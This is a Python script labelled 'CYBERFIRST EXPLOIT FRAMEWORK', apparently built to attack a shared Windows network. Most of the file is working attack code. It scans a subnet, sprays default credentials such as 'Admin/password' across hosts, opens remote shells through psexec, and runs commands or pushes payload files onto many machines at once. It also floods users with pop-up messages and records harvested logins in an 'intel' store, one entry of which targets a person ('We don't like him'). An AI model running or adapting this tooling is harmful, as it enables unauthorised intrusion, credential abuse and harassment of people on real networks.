# Everything you want in one place

import os
import time
import threading
from threading import *
import socket


banner = '''
  /$$$$$$  /$$$$$$$$ /$$$$$$$$
 /$$__  $$| $$_____/| $$_____/
| $$  \__/| $$      | $$
| $$      | $$$$$   | $$$$$
| $$      | $$__/   | $$__/
| $$    $$| $$      | $$
|  $$$$$$/| $$$$$$$$| $$
 \______/ |________/|__/
                          '''
validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "include", "exclude", "intel"]
validDesc = ["Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name" , "List all hosts stored on this device","Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Remove an IP from the protected list", "Add an IP to the protected list", "View intel on a given IP"]
validUsage = ["-", "-", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "-", "-", "-", "exclude [ip]", "include [ip]", "intel [ip]"]
ips = []
ipNames = ["Default"]
customLists = [[]]
defaultCredIps = []
exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166, 120, 125, 142, 167, 132]

completeFlags = []


intel = {
"10.181.231.138": ["We don't like him"]

}
intelSources = ["127.0.0.1"]

#=============================================================================
#=============================================================================
#SERVER SIDE - HANDLE INCOMING CONNECTIONS AND DEAL WITH REQUESTS
#=============================================================================
#=============================================================================

def serverT():
    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "127.0.0.1"
    port = 1337
    serverSock.bind((host, port))
    serverSock.listen(5)
    print("started")
    while True:
        clientsocket, address = serverSock.accept()
        client(clientsocket, address)

class client(Thread):
    global players
    def __init__(self, socket, address):
        Thread.__init__(self)
        self.localPC = None
        self.sock = socket
        self.addr = address
        self.start()

    def run(self):
        cmd = (self.sock.recv(1024).decode()).split("|")
        response = self.processRequest(cmd)
        self.sock.send(str(response).encode())

    def processRequest(self, cmd):
        global intel

        if cmd[0] == "update":
            host = cmd[1]
            info = cmd[2]
            if host in intel:
                if info not in intel[host]:
                    intel[host].append(info)
                    return "[+] Done"
                else:
                    return "[!] Already exists"
            else:
                intel[host] = [info]
                return "[+] Created record"

        if cmd[0] == "get":
            host = cmd[1]
            info = cmd[2]
            if host in intel:
                return "|".join(intel[host])
            else:
                return "No information available at this time"


#=============================================================================
#=============================================================================
#CLIENT SIDE - MAKE INFORMATION REQUESTS TO OTHER DEVICES RUNNING CFEF
#=============================================================================
#=============================================================================

def makeRequest(ip, port, type, subject, body):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    packet = (type + "|" + subject + "|" + body).encode()
    sock.send(packet)
    response = sock.recv(1024).decode()
    sock.close()
    return response

def updateIntel(host, info, action="add"):
    global intel
    if action == "add":
        if host in intel:
            if info not in intel[host]:
                intel[host].append(info)
        else:
            intel[host] = [info]

        for comp in intelSources:
            makeRequest(comp, 1337, "update", host, info)
    if action == "remove":
        if host in intel:
            if info in intel[host]:
                intel[host].remove(info)

        for comp in intelSources:
            makeRequest(comp, 1337, "remove", host, info)

def menu():
    for line in banner:
        print(line, end="")
    print("\nRun 'scan' to find all IPs, then 'credtest' to see which of those have default creds")

    while True:
        cmd = input("\n> ").split(" ")

        if cmd[0] == "help":
            print("\n[!] Available commands are:\n")
            for i in range(0, len(validCommands)):
                print("[+] " + validCommands[i] + " :: " + validDesc[i])
            print("\n[+] Type 'usage' for info on how to run the commands\n")

        if cmd[0] == "usage":
            print("\n[!] Usage is as follows:\n")
            for i in range(0, len(validCommands)):
                print("[+] " + validCommands[i] + " :: " + validUsage[i])
            print("")

        if cmd[0] == "getcmd":
            rconnect(cmd[1], cmd[2], cmd[3])

        if cmd[0] == "msg":
            rmsg()



        if cmd[0] == "clear":
            os.system("cls")
            for line in banner:
                print(line, end="")
            print("\nCYBERFIRST EXPLOIT FRAMEWORK v0.2")

        if cmd[0] == "rexec":
            if len(cmd) > 1:
                if cmd[1] == "default":
                    rexec(defaultMode=True)
            else:
                rexec()

        if cmd[0] == "rcpy":
            if len(cmd) > 1:
                if cmd[1] == "default":
                    rcpy(defaultMode=True)
            else:
                rcpy()

        if cmd[0] == "scan":
            rscan()

        if cmd[0] == "scannames":
            rscannames()

        if cmd[0] == "hosts":
            print("\n[+] TARGETS " + str(ips).replace(" ", ""))
            for i in range(0, len(ipNames)):
                print("[+] %s %s" % (ipNames[i], str(customLists[i])))

        if cmd[0] == "credtest":
            try:
                credTest(cmd[1])
            except:
                pass

        if cmd[0] == "exclude":
            if int(cmd[1]) not in exclude:
                exclude.append(int(cmd[1]))

        if cmd[0] == "include":
            if int(cmd[1]) in exclude:
                exclude.remove(int(cmd[1]))

        if cmd[0] == "intel":
            try:
                host = cmd[1]
                getintel(host)
            except:
                pass


def getintel(host):
    if host in intel:
        returnIntel = []
        print("\n[!] Showing information for %s\n" % host)
        for item in intel[host]:
            returnIntel.append(item)
        for comp in intelSources:
            info = makeRequest(comp, 1337, "get", host, "")
            info = info.split("|")
            for item in info:
                if item not in returnIntel:
                    returnIntel.append(item)
        for item in returnIntel:
            print("[+] %s" % item)





def rconnect(target, uname, pword):
    print("\n[+] Spawning shell\n")
    os.system(r"C:\Users\Admin\psexec\psexec -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword)) #CHANGE TO WHEREVER PSEXEC IS


def credTest(creds="Profile:password", iplist="default"):
    global completeFlags
    global customLists
    global ipNames
    username = creds.split(":")[0]
    password = creds.split(":")[1]
    listIndex = 0
    if iplist not in ipNames:
        ipNames.append(iplist)
        customLists.append([])
    listIndex = ipNames.index(iplist)

    completeFlags = []
    index = 0
    for i in ips:
        completeFlags.append(0)
        x = threading.Thread(target=rexecT, args=(i,username, password, "hostname", index, True, listIndex))
        x.start()
        index += 1
    while 0 in completeFlags:
        pass
    customLists[listIndex].sort()
    os.system("cls")
    print("\n[+] Found %s devices with default credentials of %s" % (str(len(customLists[listIndex])), creds))
    print("[+] " + str(customLists[listIndex]).replace(" ", ""))


def rexec(defaultMode=False, copyExe=False):
    global completeFlags
    global outputs
    completeFlags = []

    iprangeMin = int(input("\n[IPMIN]> "))
    iprangeMax = int(input("[IPMAX]> ")) + 1
    if not defaultMode:
        uname = input("[UNAME]> ")
        pword = input("[PWORD]> ")
        cmnd = input("[COMND]> ")
        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in ips and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rexecT, args=(i,uname, pword, cmnd, index))
                x.start()
                time.sleep(.1)
                index += 1
        while 0 in completeFlags:
            pass
    else:
        cmnd = input("[COMND]> ")
        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in defaultCredIps and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rexecT, args=(i,"Admin", "password", cmnd, index))
                x.start()
                time.sleep(.1)
                index += 1
        while 0 in completeFlags:
            pass
    print("\n[+] Done")


def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): # The actual function for executing a command so that it can be threaded
    global completeFlags
    global customLists

    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
    resp = os.system(psexecString)
    if sav and tgt not in customLists[listIndex]:
        infostring = "LOGIN: " + uname + "/" + pword
        if str(resp) == "0":
            customLists[listIndex].append(ending)
            updateIntel(tgt, infostring)
        else:
            updateIntel(tgt, infostring, action="remove")

    completeFlags[index] = 1


def rcpy(defaultMode=False):
    global completeFlags
    completeFlags = []
    interactive = input("[!] Specify if you want this to run visibly on the desktop with y/n\n[SCREEN]> ")
    if interactive.lower() == "y":
        interactive = True
        print("[+] Interactive is on")
    else:
        interactive = False
    fname = input("[FILE ]> ")
    iprangeMin = int(input("\n[IPMIN]> "))
    iprangeMax = int(input("[IPMAX]> ")) + 1
    if defaultMode == False:
        uname = input("[UNAME]> ")
        pword = input("[PWORD]> ")

        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in ips and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rcpyT, args=(i,uname, pword, fname, index, interactive))
                x.start()
                index += 1
        while 0 in completeFlags:
            pass
    else:
        index = 0
        for i in range(iprangeMin, iprangeMax):
            if i in ips and i not in exclude:
                completeFlags.append(0)
                x = threading.Thread(target=rcpyT, args=(i,"Profile", "password", fname, index, interactive))
                x.start()
                index += 1
        while 0 in completeFlags:
            pass
    print("\n[+] Done")


def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False): # The actual function for executing a command so that it can be threaded
    global completeFlags
    global defaultCredIps
    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = ""
    if onDesktop == False:
        psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s -c %s\%s"' % (tgt, uname, pword, PATH_TO_PAYLOADS, fname)
    else:
        psexecString = r'C:\Users\Admin\psexec\psexec -nobanner \\%s -u %s -p %s -c "%s\%s"' % (tgt, uname, pword, PATH_TO_PAYLOADS, fname)
    resp = os.system(psexecString)
    completeFlags[index] = 1


def rscan():  # Conducts a ping scan to discover any hosts on the network
    global ips
    ips = []
    for i in range(100, 240):
        ip = "10.181.231." + str(i)
        if os.system("ping -n 1 -w 100 " + ip) == 0:
            ips.append(i)
    os.system("cls")
    print("\n==================================================")
    print("\n[+] PRESCAN COMPLETE")
    print("\n[+] DISCOVERED: " + str(len(ips)))
    print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
    print("\n==================================================\n")


def rscannames():  # Conducts a scan of the netbios names to discover any hosts on the network
    global ips
    ips = []
    for name in range(63):
        ips.append(os.system(r"C:\Users\Admin\nbtscan " + "\"" + str(name) + "\""))
    os.system("cls")
    print("\n==================================================")
    print("\n[+] PRESCAN COMPLETE")
    print("\n[+] DISCOVERED: " + str(len(ips)))
    print("\n[+] RANGE: " + str(ips[0]) + " -> " + str(ips[-1]))
    print("\n==================================================\n")


def rmsg():
    maxThreads = 64
    iprangeMin = int(input("\n[IPMIN]> "))
    iprangeMax = int(input("[IPMAX]> ")) + 1
    reason = input("[MESSG]> ")
    num = int(input("[NUMBR]> "))
    print("")
    for t in range(0, num):
        for i in range(iprangeMin, iprangeMax):
            if i in ips:
                target = "10.181.231." + str(i)
                x = threading.Thread(target=rmsgT, args=(reason,target))
                x.start()


def rmsgT(reason="", target=""):
    print("[+] MESSAGING:", target)
    os.system(r'msg Admin /SERVER %s %s' % (target, reason))

x = threading.Thread(target=serverT)
x.start()
menu()
